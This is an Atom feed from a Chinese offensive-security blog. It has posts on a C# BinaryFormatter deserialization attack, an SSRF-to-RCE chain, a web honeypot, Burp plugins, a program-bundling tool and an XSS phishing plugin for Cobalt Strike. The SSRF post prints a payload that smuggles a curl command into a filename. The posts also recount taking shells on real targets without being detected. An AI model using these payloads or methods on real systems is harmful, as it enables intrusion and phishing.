<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://blog.thekingofduck.com</id>
    <title>CoolCat&apos; Blog</title>
    <updated>2021-09-15T11:16:47.288Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://blog.thekingofduck.com"/>
    <link rel="self" href="https://blog.thekingofduck.com/atom.xml"/>
    <subtitle>当代废物</subtitle>
    <logo>https://blog.thekingofduck.com/images/avatar.png</logo>
    <icon>https://blog.thekingofduck.com/favicon.ico</icon>
    <rights>All rights reserved 2021, CoolCat&apos; Blog</rights>
    <entry>
        <title type="html"><![CDATA[记一个黑盒挖到的C#程序反序列化漏洞]]></title>
        <id>https://blog.thekingofduck.com/post/CSharpProgramDeserialize/</id>
        <link href="https://blog.thekingofduck.com/post/CSharpProgramDeserialize/">
        </link>
        <updated>2021-09-15T10:12:34.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>Author: TheKingOfDuck</p>
</blockquote>
<p>很久之前黑盒挖到的一个漏洞，过程比较有意思。</p>
<p>前置知识:</p>
<pre><code>https://xz.aliyun.com/t/9168
https://xz.aliyun.com/t/9591
https://xz.aliyun.com/t/9593
https://xz.aliyun.com/t/9592
https://xz.aliyun.com/t/9594
https://xz.aliyun.com/t/9595
https://xz.aliyun.com/t/9597
https://xz.aliyun.com/t/9598
https://xz.aliyun.com/t/9599
https://xz.aliyun.com/t/9600
https://xz.aliyun.com/t/9601
https://xz.aliyun.com/t/9602
https://xz.aliyun.com/t/9603
https://xz.aliyun.com/t/9604
https://xz.aliyun.com/t/9605
</code></pre>
<p>懒得挨个点开可以直接查看主页:</p>
<pre><code>https://xz.aliyun.com/u/12258
</code></pre>
<p>Y4er的文章应该全文背诵.</p>
<h3 id="0x01-起">0x01 起</h3>
<p>拿到一个压缩包,里面有个客户端程序但根本不敢运行,怕被反打被钓鱼,所以只是翻了翻程序运行配置和日志,配置中找到一组账号密码,有加密但是估计问题不大,如果账号密码正确直接运行应该是可以登录的。环境有些恶劣,物理机本身都卡装虚拟机运行肯定是不现实的,只得先拖进peid查一下看看是什么程序,研究一下密码明文能不能解出来,没准其他地方也能用。</p>
<p>拖进<code>PEID</code>的时候意外发生了,不小心点了一下导致程序运行了。看到登录框有账号密码虽然验证了猜想,但运行是件非预期的事情,赶紧关闭,然后拖进360杀毒扫了一下,有两个<code>dll</code>报毒...那种恐慌感至今记忆犹新。排查计划任务排查进程删敏感文件,一套操作下来仍不放心,就差关机换机器了。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316737974277.jpg" alt="" loading="lazy"></figure>
<p>所幸后续在VT查出报毒的两个<code>dll</code>都是多年前就被标记的,显然不可能是为了当前场景准备的水坑,逆向看代码也未找到什么可疑的代码段,故正常运行,账号也确实可登陆,权限为某部们下的管理员,可查看该部门下所有员工的信息以及跳转认证到一些其他系统,相关功能及站点未发现可<code>getshell</code>的点,该部门也和推断的管理目标的部门有些远,已知了账号规律和默认密码,故希望爆破获取到权限更高一些的账号,方便查看更多的信息,登录更多的系统。</p>
<h3 id="0x02-承">0x02 承</h3>
<p>抓包发现流量是有加密的,无法直接爆破,需要解决加密问题。</p>
<p><strong>代码分析:</strong></p>
<p>根据登录按钮的文字提示定位到对应的点击事件:</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316897826629.jpg" alt="" loading="lazy"></figure>
<p>点击后会判断账号密码验证码这些是否为空,然后进入登录事件<code>OnLoginEvent</code></p>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316906394011.jpg" alt="" loading="lazy"></figure>
<p>往下继续跟会发现比较有意思的点是它没有直接传递输入框中拿到的值,而是塞进<code>UserInfo</code>里,再调用<code>SendLoginMsg</code>方法进一步处理</p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316909581522.jpg" alt="" loading="lazy"></figure>
<p>继续套娃,将<code>UserInfo</code>塞到<code>MsgSysInfo</code>再调<code>zip</code>的对象中<code>GetBuffer</code>方法去处理最后交个给<code>Login</code>方法,看到这初步怀疑程序可能有问题,就算没有直接传递相关值,那到最后发送相关的处理前应该要转成<code>json</code>之类的才符合预期。</p>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316920311571.jpg" alt="" loading="lazy"></figure>
<p><code>zip</code>和<code>dh</code>是分别在构造方法及其调用的<code>Init</code>方法中初始化完成,前者里面的相关方法主要是数据压缩加密,后者是数据发送。<br>
<img src="https://blog.thekingofduck.com/post-images/16316733199903/16316933138030.jpg" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316929693665.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316932189590.jpg" alt="" loading="lazy"></figure>
<p>先看被调用的<code>YYSharpZip</code>中的<code>GetBuffer</code>方法,调用顺序如下图所示,<code>GetZipBuffer</code>方法在压缩之前先调<code>BinaryFormatter</code>对传入的对象进行了序列化操作,完了再去调加密方法<code>EncryptData</code>进行数据加密。<br>
<img src="https://blog.thekingofduck.com/post-images/16316733199903/16316926747757.jpg" alt="" loading="lazy"></p>
<p>客户端对数据处理的过程中有序列化的操作,那服务端接受到数据后必然有反序列化的操作,盲猜有洞,整理调用流程如下:</p>
<pre><code>this.btnLogin_Click --&gt; this.OnLoginEvent() --&gt; this.SendLoginMsg() --&gt; this.zip.GetBuffer() --&gt; this.ZipData() --&gt; this.GetZipBuffer() --&gt; new BinaryFormatter().Serialize() --&gt; this.CompressToByte() --&gt; new YYEncrypt().EncryptData() --&gt; this.dh.Login()
</code></pre>
<p>盲猜服务器处理逻辑流程如下:</p>
<pre><code>XXX.MsgReceive --&gt; new YYEncrypt().DecryptData--&gt;this.DeCompressToBytes --&gt; new BinaryFormatter().Deserialize() --&gt; this.msgSysInfo.getLoginInfo() --&gt; XXX
</code></pre>
<p>漏洞验证逻辑应当如下:</p>
<pre><code>Ysoserial.NET --&gt; Gadget serialize data --&gt; this.zip.GetBuffer --&gt; this.ZipData --&gt; this.GetZipBuffer --&gt; new BinaryFormatter().Serialize() --&gt; this.CompressToByte --&gt; new YYEncrypt().EncryptData --&gt; Send To Tartget Server --&gt; XXX.MsgReceive --&gt; new YYEncrypt().DecryptData--&gt;this.DeCompressToBytes --&gt; new BinaryFormatter().Deserialize() --&gt; Attack success
</code></pre>
<h3 id="0x03-转">0x03 转</h3>
<p>按照猜想的验证逻辑写好漏洞利用代码,本地测试了几条<code>Gadget</code>后成功弹出计算器。</p>
<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316960301985.jpg" alt="" loading="lazy"></figure>
<p>本地成功弹出计算器的<code>Gadget</code>在目标上并未正常执行,依然是重新试了几条<code>Gadget</code>后命令才得以执行成功,写文件访问不到,<code>Ysoserial.NET</code>中提供的回显方法当时未测试成功,时间紧也没法投入精力去研究其原因,Windows一直无回显执行命令就怪难受的...所幸服务器的发现服务器其他端口开了<code>iis</code>. 默认路径写<code>aspx</code>拿到<code>shell</code>.</p>
<h3 id="0x04-合">0x04 合</h3>
<p>程序是通用的,前前后后打了七八个<code>shell</code>,由于其自带的加密给<code>payload</code>上了保护伞,攻击过程并未被发现过,有意思的是内网扫描被发现后起初防御人员排查的时候采取的措施是删除某个打<code>payload</code>前会探测的特征文件。🐮得很，可关服务器才是最强防御措施！</p>
<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316964789051.jpg" alt="" loading="lazy"></figure>
<p>整个过程并未看到过服务端代码,看似黑盒,可站在开发的逻辑上来看,盲猜的处理逻辑是完全合理的,也就说漏洞其实是一个理所应当的过程,开发就要那么写,能怎么办? ORZ不如换份开发的工作去卷他们的饭碗得了...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[记一次从鸡肋SSRF到RCE的代码审计过程]]></title>
        <id>https://blog.thekingofduck.com/post/ssrf2rce/</id>
        <link href="https://blog.thekingofduck.com/post/ssrf2rce/">
        </link>
        <updated>2021-09-15T02:12:32.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>Author: TheKingOfDuck@0KEE TEAM</p>
</blockquote>
<p>Python标准库中用来处理HTTP相关的模块是urllib/urllib2，不过其中的API十分零碎，比如urllib库有urlencode,但urllib2没有,经常需要混在一起使用,换个运行环境可能又无法正常运行,除了urllib和urllib2之外,会经常看到的还有一个urllib3,该模块是服务于升级的http 1.1标准，且拥有高效http连接池管理及http代理服务的功能库,但其并非python内置,需要自行安装,使用起来仍很复杂,比如urllib3对于POST和PUT请求(request),需要手动对传入数据进行编码，然后再加在URL之后,非常麻烦。requests是基于urllib3封装的,继承了urllib2的所有特性,遵循Apache2 Licensed开源协议的HTTP库，支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动响应内容的编码，支持国际化的URL和POST数据自动编码。如他的口号HTTP for Humans所说,这才是给人用的HTTP库,实际使用过程中更方便,能够大大的提高使用效率,缩短写代码的时间。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16276115222982.jpg" alt="" loading="lazy"></figure>
<p>实战中遇到过这样一个案例,一个输入密码正确后会302跳转到后台页面的登录口存在盲注,但登录数据有加密,无法试用sqlmap完成自动注入的过程,于是想编写python脚本自动化完成这个过程,requests是首选,实际编写过程中会发现默认属性下其无法获取到30X状态码的详情,分析其代码后发现requests的所有请求方法(GET/POST/HEAD/PUT/DELETE)均会默认跟随30X跳转,继承了urlib3默认跟随30X跳转的属性,并将30X连续跳转的次数上限从3次修改为30次,如果返回状态码是304/305/306/309会保持原来的请求方法,但不会跳转,返回状态码是307/308会保持原请求方法,并且跳转,其他30x状态码则会将请求方法转化为GET。如需禁止跳转需将allow_redirects属性的值设置为False。</p>
<p>下面将分享一个因为这个特性导致的从ssrf到rce的漏洞组合拳。</p>
<h3 id="0x01-起">0x01 起</h3>
<p>某系统的升级功能可配置自定义的站点, 点击升级按钮后会触发向特定路由发送文件, 也就是一个鸡肋的<code>POST</code>类型的<strong>路由和参数均不可控</strong>的<code>SSRF</code>。</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16274405259038.jpg" alt="" loading="lazy"></figure>
<p>如下图,<code>**_update</code>是从用户自定义的配置中取的, 与固定的<code>route</code>变量拼接后作为发送文件的<code>url</code></p>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/16231381871104/carbon%20-2-.png" alt="carbon -2-" loading="lazy"></figure>
<p>利用上文提到的requests默认跟随状态码<code>30X</code>跳转的特性, 可将这个鸡肋的<code>SSRF</code>变成一个<code>GET</code>类型的<strong>路由和参数均可控</strong>的<code>SSRF</code></p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231399852941.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231403597550.jpg" alt="" loading="lazy"></figure>
<h3 id="0x02-承">0x02 承</h3>
<p>该软件的分层大致如下图, 鉴权在应用层, 涉及数据涉及敏感操作的均通过api调用另一个端口的上的服务, 该过程无鉴权。思路比较清晰, 可审计服务层的代码漏洞结合已有的<code>SSRF</code>进一步扩大危害。</p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231420987479.jpg" alt="" loading="lazy"></figure>
<p>受这个<code>SSRF</code>本身的限制, 寻找服务层漏洞时优先看请求方式为<code>GET</code>的路由, 筛选后找到一个符合条件的漏洞点如下图所示, 传入的<code>doc_file_path</code>参数可控, 如果文件名中能带入自己的恶意<code>Payload</code>且文件能够存在的情况下, 拼接到<code>cmd</code>变量中后有机会<code>RCE</code>。</p>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/16231381871104/carbon%20-5-.png" alt="carbon -5-" loading="lazy"></figure>
<p>走到命令拼接的前置条件是文件存在, 故先查看上传部分代码, 如下图所示, <a href="https://docs.python.org/zh-cn/3/library/tempfile.html#tempfile.mkstemp">mkstemp方法</a>的作用是以最安全的方式创建一个临时文件, 该文件的文件名随机, 创建后不会自动删除, 需用户自行将其删除, <code>suffixs</code>是指定的后缀, 也就是说文件虽然可以落地, 但文件名不可控, 无法拼接自己的<code>Payload</code>。</p>
<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/16231381871104/carbon%20-6-.png" alt="carbon -6-" loading="lazy"></figure>
<p>此时只能作为一个任意文件删除的漏洞来使用, 配置升级链接<code>301</code>跳转到<code>http://127.0.0.1:8848/api/doc?doc_file_path=/etc/passwd</code>, 其中<code>doc_file_path</code>参数为已知的存在的文件, 点击系统升级按钮即可触发删除操作。</p>
<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231450850678.jpg" alt="" loading="lazy"></figure>
<h3 id="0x03-转">0x03 转</h3>
<p>继续分析代码，阅读大量代码后找到一处上传文件的功能点如下图所示, 其中<code>file_pre</code>为源文件名, 拼接下划线,时间戳以及<code>.txt</code>后保存并返回了完整的文件路径，正好符合上面的要求。</p>
<figure data-type="image" tabindex="10"><img src="https://blog.thekingofduck.com/post-images/16231381871104/carbon%20-7-.png" alt="carbon -7-" loading="lazy"></figure>
<p>源文件名可控, 路径已知,<code>SSRF</code>升级<code>RCE</code>变得索然无味, 使用分号切割命令语句,带参数的命令可以使用<code>${IFS}</code>绕一下空格问题, 涉及到的<code>${;</code>均为unix系统文件名允许使用范围的字符。</p>
<figure data-type="image" tabindex="11"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231467468992.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231473020945.jpg" alt="" loading="lazy"></figure>
<h3 id="0x04-合">0x04 合</h3>
<p>参数及路由均不可控<code>POST</code>类型的<code>SSRF</code> -&gt; <code>requests</code> <code>30X</code>跳转特性 -&gt; 参数和路由均可控的<code>GET</code>类型<code>SSRF</code> -&gt; 文件名部分可控的文件上传 -&gt; 多点结合攻击本地服务</p>
<p>最终Payload如下:</p>
<pre><code>http://127.0.0.1:8848/api/doc?doc_file_path=
/opt/work/files/target_file/admin/;curl${IFS}rce.me;_1623123227304.txt
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231476384950.jpg" alt="" loading="lazy"></figure>
<p>配置完成手动点击一下升级功能即可触发命令执行。</p>
<figure data-type="image" tabindex="14"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231477715089.jpg" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Loki - 一个轻量级Web蜜罐]]></title>
        <id>https://blog.thekingofduck.com/post/loki-web-honeypot/</id>
        <link href="https://blog.thekingofduck.com/post/loki-web-honeypot/">
        </link>
        <updated>2021-01-31T11:42:23.000Z</updated>
        <content type="html"><![CDATA[<p>https://github.com/TheKingOfDuck/Loki</p>
<h3 id="0x01-why">0x01 Why</h3>
<p>目标: 抓漏洞.<br>
大概是没有找到啥子开源的符合我预期的蜜罐吧，所以自己动手写了。</p>
<h3 id="0x02-what">0x02 What</h3>
<p>想做什么样的蜜罐?</p>
<p>1.便于维护,随开随用,配置简单。<br>
2.Web低仿真即可,且只抓Web流量。<br>
3.不同端口指向不同的页面,响应头配置等。</p>
<h3 id="0x03-how">0x03 How</h3>
<p>SpringBoot是最强Web框架没有之一,数据库选用SQLite。两者结合基本上就可以实现一个jar加db文件就完成需求。</p>
<h3 id="0x04-process">0x04 Process</h3>
<p>管理页面选用layui作为前端框架,后台地址和端口以及账号密码通过配置文件动态配置。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1612093490242.jpg" alt="" loading="lazy"></figure>
<p>多端口方便其实就是给tomcat添加几个监听的端口而已:</p>
<pre><code>Connector connector = new Connector(&quot;org.apache.coyote.http11.Http11NioProtocol&quot;);
connector.setScheme(scheme);
connector.setPort(Integer.parseInt(port));
result.add(connector);
</code></pre>
<p>然后是不同端口指向不同页面:</p>
<p>配置文件</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/1612093569434.jpg" alt="" loading="lazy"></figure>
<p>判断逻辑</p>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/1612093585093.jpg" alt="" loading="lazy"></figure>
<p>port是限制的端口,path是本地模板的路径,code是返回的状态码,header是相应的header,respbody本来是想正对一些特定的请求返回不同页面的,逻辑没有思考的很清楚,暂时搁置了。</p>
<h4 id="页面捕获">页面捕获</h4>
<p>过程比较耗时间,期初想拦截所有异常,在做统一处理即可,可实际过程发现springboot默认开起了add-mappings无法捕获404页面,而且静态资源过来的请求无法捕获,如果遇到解析差异那种洞就只能错过。关闭的话静态资源访问配置又会很麻烦。</p>
<p>查阅相关文档后发现可以继承  ErrorController + @ControllerAdvice + @ExceptionHandle 处理一切异常,这也包括404页面,</p>
<p>Demo:</p>
<pre><code>NotFoundController.java

@Controller
public class NotFoundController implements ErrorController {
 
    @Override
    public String getErrorPath() {
        return &quot;/error&quot;;
    }
    @RequestMapping(value = {&quot;/error&quot;})
    public Object error(HttpServletRequest request) {
        //请求处理
        return &quot;404&quot;;
    }
}
</code></pre>
<pre><code>ExceptionController.java

@ControllerAdvice
public class ExceptionController {
 
    @ExceptionHandler(value = {Exception.class})
    public Object error(Exception ex){
        //请求处理
        return &quot;500&quot;;
    }
}
</code></pre>
<p>这也处理确实能捕获到404页面,可是有个bug</p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/1612093604938.jpg" alt="" loading="lazy"></figure>
<p>getServletPath方法获取的路由恒为error,这也是springboot的特征之一,所有错误均会交由error路由处理,也就是说error默认是肯定存在的。</p>
<p>正确的处理方式是在过滤器中进行记录:</p>
<pre><code>public class LokiFilter implements Filter{

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        log.info(&quot;Loki Filter is init.... &quot;);
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        //请求处理
        filterChain.doFilter(request, response);
    }

    @Override
    public void destroy() {
        log.info(&quot;Loki Filter was destroyed....&quot;);
    }
}
</code></pre>
<p>嗯,内存马也得在这层搞,不然鬼知道别人路由咋写的。</p>
<h3 id="0x05-result">0x05 Result</h3>
<p>代码结构:</p>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/1612093623129.png" alt="" loading="lazy"></figure>
<p>后台页面:</p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/1612093636730.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/1612093761078.png" alt="" loading="lazy"></figure>
<p>模板文件:</p>
<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/1612093774985.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/1612093789285.jpg" alt="" loading="lazy"></figure>
<p>一些有趣的事情:</p>
<p>1.在公网跑起来后我收到的第一个请求是nmap扫cobaltstrike的。</p>
<figure data-type="image" tabindex="10"><img src="https://blog.thekingofduck.com/post-images/1612093806150.png" alt="" loading="lazy"></figure>
<p>2.配置的通达和致远的页面都被来自河南和云南的两个IP人为访问过两次,识别依据是浏览器会自动加载/favicon.ico,脚本不会。</p>
<p>3.被89.248.160.151这个IP扫了一通.txt的文件,还有一些请求路径是@.txt,不知道是不是扫描器没配好。</p>
<figure data-type="image" tabindex="11"><img src="https://blog.thekingofduck.com/post-images/1612093827620.png" alt="" loading="lazy"></figure>
<p>4.创宇的censys爬虫先是先访问了8090端口,然后是88端口,中间间隔了将近14小时,bing的爬虫也到访过一次,fofa的爬虫没看到,但是有上百条ua为Go-http-client/1.1和fasthttp的请求,python的只有一条。</p>
<p>5.捕获了两个漏洞:</p>
<figure data-type="image" tabindex="12"><img src="https://blog.thekingofduck.com/post-images/1612093839683.jpg" alt="" loading="lazy"></figure>
<p>搜索了一下应该是Linksys路由的命令注入.</p>
<figure data-type="image" tabindex="13"><img src="https://blog.thekingofduck.com/post-images/1612093860509.png" alt="" loading="lazy"></figure>
<p>看起来是未授权相关的漏洞,80端口配置了很低从其他蜜罐上扒下来的Server头,可能是其中一款产品的洞吧,涉及的产品太多,百度没搜到这个路由,无法验证了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[captcha-killer修改随笔]]></title>
        <id>https://blog.thekingofduck.com/post/recode-captcha-killer/</id>
        <link href="https://blog.thekingofduck.com/post/recode-captcha-killer/">
        </link>
        <updated>2020-08-08T09:50:14.000Z</updated>
        <content type="html"><![CDATA[<p>成品如下:</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1596880625428.png" alt="" loading="lazy"></figure>
<p>新增功能特性:<br>
1.当验证码结果返回值非图标时，使用自定义正则匹配验证码位置。<br>
2.当识别出匹配结果为图标时自动锁定正则输入框以及匹配按钮。<br>
3.针对团队购买的识别接口返回值预设正则, etc...</p>
<p>适应新场景：<br>
requests:</p>
<pre><code>GET /xxxx.ashx?op=getVerifyCodeImage HTTP/1.1
Host: www.baidu.com
</code></pre>
<p>response:</p>
<pre><code>{&quot;success&quot;:true,&quot;image&quot;:&quot;图标的base64值&quot;}
</code></pre>
<p>输入正则:</p>
<pre><code>&quot;success&quot;:true,&quot;image&quot;:&quot;(.*?)&quot;
</code></pre>
<p>即可正常识别。</p>
<p>修改过的位置<br>
<img src="https://blog.thekingofduck.com/post-images/1596881092380.png" alt="" loading="lazy"></p>
<p>如图中代码所示，原作者提了一个burp自带的发包，无法指定超时这个问题，有趣的是自己印象中超时一直都是再Intruder的超时是可以在option中指定的。</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/1596881494055.jpeg" alt="" loading="lazy"></figure>
<p>认真看了一下pause before retry和超时没半毛钱关系，一直以来都看错了...</p>
<p>问题其实出在MorePayloads的判断上，原代码未判断是否有新的payload生成，直接无条件的返回true，这一来即便请请求第三方网站的识别结果尚未回来，burp也认为有新的Payload生成了，直接调自然就只能返回空了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Copy2Yaml:一键生成yaml poc]]></title>
        <id>https://blog.thekingofduck.com/post/copy2yaml/</id>
        <link href="https://blog.thekingofduck.com/post/copy2yaml/">
        </link>
        <updated>2020-06-27T16:38:24.000Z</updated>
        <content type="html"><![CDATA[<p>初次使用JavaFX，不得不说体验比swing强太多了。</p>
<p>开发过程忘记了burp是swing画的GUI，调试卡了好久，难受啊。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1593276055852.jpg" alt="" loading="lazy"></figure>
<p>对标xray的poc来开发的，虽然兼容但是不是写给xray用的。</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/1593276097179.jpg" alt="" loading="lazy"></figure>
<p>写了支持终端模式，burp插件模式，在或者直接打开复制粘贴数据包也是可以的，又是写bug的一天。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MatryoshkaDollTool-一款程序捆绑工具]]></title>
        <id>https://blog.thekingofduck.com/post/MatryoshkaDollTool/</id>
        <link href="https://blog.thekingofduck.com/post/MatryoshkaDollTool/">
        </link>
        <updated>2020-05-23T15:33:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="what">WHAT</h3>
<p>一款程序捆绑工具，取名MatryoshkaDollTool，也叫俄罗斯套娃工具。</p>
<p>开源这个只有基础捆绑功能的版本，给套娃程序添加自启以及加密功能的版本哪天高兴了就开源。</p>
<h3 id="why">WHY</h3>
<p>找不到好用的没后门的捆绑工具所以自己动手写了。</p>
<h3 id="how">HOW</h3>
<figure data-type="image" tabindex="1"><img src="https://github.com/TheKingOfDuck/MatryoshkaDollTool/blob/master/img/screenshot.png" alt="" loading="lazy"></figure>
<h3 id="where">WHERE</h3>
<p>成品在bin目录下。</p>
<h3 id="todo-list">TODO List</h3>
<ul>
<li>把目前的壳变成真壳。</li>
<li>开放添加套娃的自启，加密。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XSS-Fishing2-CS：钓鱼自动收杆指南]]></title>
        <id>https://blog.thekingofduck.com/post/XSS-Fishing2-CS/</id>
        <link href="https://blog.thekingofduck.com/post/XSS-Fishing2-CS/">
        </link>
        <updated>2020-04-19T14:23:30.000Z</updated>
        <content type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~</p>
<p>项目地址：<a href="https://github.com/TheKingOfDuck/XSS-Fishing2-CS">XSS-Fishing2-CS</a></p>
<p>使用场景：使用xss弹窗提示钓鱼的时候会面临这样一个问题，如果鱼儿已经上线了，页面那边还在不停的弹窗，很容易引起鱼儿怀疑，权限说没就没了。</p>
<h3 id="开发">开发</h3>
<p>cs插件:<br>
<img src="https://blog.thekingofduck.com/post-images/fishing2.png" alt="" loading="lazy"></p>
<p>没啥难度，都是照着官方函数库复制...魔性的是我的ubantu死活跑不起来，centos可以...</p>
<p>php端：<br>
<img src="https://blog.thekingofduck.com/post-images/fishing1.png" alt="" loading="lazy"><br>
都是基本 语法，基本逻辑，但是遇到一个有趣的弱类型问题：</p>
<pre><code>fwrite(&quot;ips.txt&quot;, &quot;127.0.0.1&quot;);
</code></pre>
<p>写入的结果是127，之后的内容会被当做小点数被忽略掉，所以图中代码那个base64并非我闲着没事做...</p>
<h3 id="使用">使用</h3>
<p>1.将xss.php放到自己的服务器上去并修改第三行的钓鱼Payload。</p>
<p>2.修改xssFisher.cna第4行中的企业微信机器人的密钥，第23行中的xss.php的实际地址。</p>
<p>3.加载cs插件，将xss的Payload插入目标页面。</p>
<h3 id="特点">特点</h3>
<p>1.企业微信上线提示</p>
<p>2.机器上线后立即停止钓鱼的弹窗</p>
<p>3.只停止单个IP的弹窗，其他IP仍然可以继续弹窗，继续上线。</p>
<h3 id="todo">TODO</h3>
<p>1.特定网段上线的问题（？这个场景没有很清楚）<br>
2.内网ip也判断下，避免出现多个目标在一个小的局域网共用一个外网IP，其中一台上线后其他机器就不弹窗了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Copy2Java：在Burp中一键生成Java代码]]></title>
        <id>https://blog.thekingofduck.com/post/Copy2Java/</id>
        <link href="https://blog.thekingofduck.com/post/Copy2Java/">
        </link>
        <updated>2020-04-12T17:18:19.000Z</updated>
        <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/TheKingOfDuck/Copy2Java">https://github.com/TheKingOfDuck/Copy2Java</a></p>
<h3 id="0x01-初始化">0x01 初始化</h3>
<p>先说说为什么要用Java写这个插件？为什么要生成的是Java的代码。</p>
<p>1.简化安全从业者用Java写web漏洞利用工具的流程。</p>
<p>2.其他语言有插件实现了，生成现成的JAVA代码可在强迫自己使用Java的同时也不会拉低效率。</p>
<h3 id="0x02-加载中">0x02 加载中</h3>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413020409078.png" alt="image-20200413020409078" loading="lazy"></figure>
<p>代码写完回头再看除了感觉辣鸡没什么太多其他感觉，过程中最麻烦的是画GUI，intellj拖控件有点恶心，eclipse拖好后再复制回intellj即可。在http发包方面目前用过的最方便的是HttpRequest，所以生成的代码依赖也选择它，打包在了项目的lib目录，导入即可。</p>
<h3 id="0x02-加载成功">0x02 加载成功</h3>
<p>使用:</p>
<p>1.加载插件：</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413021026557.png" alt="image-20200413021026557" loading="lazy"></figure>
<p>2.在burp的repeater中点击Copy2Java菜单：</p>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413021159116.png" alt="image-20200413021159116" loading="lazy"></figure>
<p>3.设置是否开启代理【可选】：</p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413021244692.png" alt="image-20200413021244692" loading="lazy"></figure>
<p>默认是不开代理的，没需要的话这部可以跳过。</p>
<p>4.点击步骤3中弹出的窗口中的Copy to clipboard按钮复制代码并粘贴到ide:</p>
<p>添加插件lib目录下的依赖包</p>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413021640508.png" alt="image-20200413021640508" loading="lazy"></figure>
<p>完成</p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413022210153.png" alt="image-20200413022210153" loading="lazy"></figure>
<p>如何高效的写一个web相关漏洞的利用工具？</p>
<p>1.新建mvn项目，并将生成的代码复制进来。</p>
<p>2.修改传入的参数，mvn package快速打包。</p>
<p>比用Python写慢？不存在的！</p>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413022944759.png" alt="image-20200413022944759" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[JoomlaCracker: JoomlaCracker CMS 批量爆破工具]]></title>
        <id>https://blog.thekingofduck.com/post/JoomlaCracker/</id>
        <link href="https://blog.thekingofduck.com/post/JoomlaCracker/">
        </link>
        <updated>2020-04-11T11:44:34.000Z</updated>
